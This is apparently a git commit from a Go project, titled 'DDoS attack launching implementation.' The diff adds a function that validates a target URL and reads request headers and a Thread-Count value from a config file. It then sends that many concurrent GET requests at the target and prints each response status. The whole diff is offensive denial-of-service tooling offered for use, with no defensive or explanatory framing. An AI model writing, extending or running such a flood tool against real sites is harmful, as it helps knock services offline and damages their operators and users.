2bcdf2cb11ce6f78210545ba09a1c5e941d1edbe
nthnn <nathanneisip@gmail.com>
2023-09-21 19:08:33 +0800

    DDoS attack launching implementation.

--- src/ddos.go
+++ src/ddos.go
@@ -3,17 +3,19 @@ package main
 import (
 	"fmt"
 	"net/http"
+	"net/url"
 	"os"
+	"sync"
 
 	"github.com/fatih/color"
 )
 
-func createRequest(client http.Client, url string) *http.Request {
+func createRequest(url string) *http.Request {
 	req, _ := http.NewRequest("GET", url, nil)
 	return req
 }
 
-func ddos(configFile string) {
+func ddos(urlStr string, configFile string) {
 	greenPrn := color.New(color.FgGreen)
 	redPrn := color.New(color.FgRed)
 
@@ -21,6 +23,15 @@ func ddos(configFile string) {
 	fmt.Print("Initiating ")
 	greenPrn.Print("DDoS")
 	fmt.Println(" attack...")
+
+	_, err := url.ParseRequestURI(urlStr)
+	if err != nil {
+		greenPrn.Print("  ‣ ")
+		redPrn.Print("Invalid ")
+		fmt.Printf("input URL: %s\n", urlStr)
+
+		return
+	}
 
 	_, configExists := os.Stat(configFile)
 	if os.IsNotExist((configExists)) {
@@ -30,4 +41,60 @@ func ddos(configFile string) {
 
 		return
 	}
+
+	properties := loadPropertiesFile(configFile)
+	greenPrn.Print("  ‣ ")
+	fmt.Print("Loaded configuration file ")
+	greenPrn.Print("successfully")
+	fmt.Println(".")
+
+	client := &http.Client{}
+	req := createRequest(urlStr)
+	threadCount := 0
+
+	keys := properties.Keys()
+	for i := 0; i < len(keys); i++ {
+		currentKey := keys[i]
+
+		if currentKey != "Thread-Count" {
+			value, found := properties.Get(currentKey)
+
+			if found {
+				req.Header.Add(currentKey, value)
+			}
+		} else {
+			threadCount += properties.GetInt("Thread-Count", 0)
+		}
+	}
+
+	greenPrn.Print("  ‣ ")
+	fmt.Print("Launching DDoS ")
+	greenPrn.Print("attack")
+	fmt.Println(".")
+
+	var wg sync.WaitGroup
+	for i := 0; i < threadCount; i++ {
+		wg.Add(1)
+
+		go func(iterNum int) {
+			response, err := client.Do(req)
+			defer wg.Done()
+
+			if err != nil {
+				redPrn.Printf("    [%d] ", iterNum+1)
+				fmt.Printf("Error: %s\n", err.Error())
+
+				return
+			}
+
+			greenPrn.Printf("    [%d] ", iterNum+1)
+			fmt.Printf("Request sent. (%d)\n", response.StatusCode)
+		}(i)
+	}
+	wg.Wait()
+
+	greenPrn.Print("  ‣ ")
+	greenPrn.Print("Done ")
+	fmt.Print("launching DDoS attack")
+	fmt.Println(".")
 }
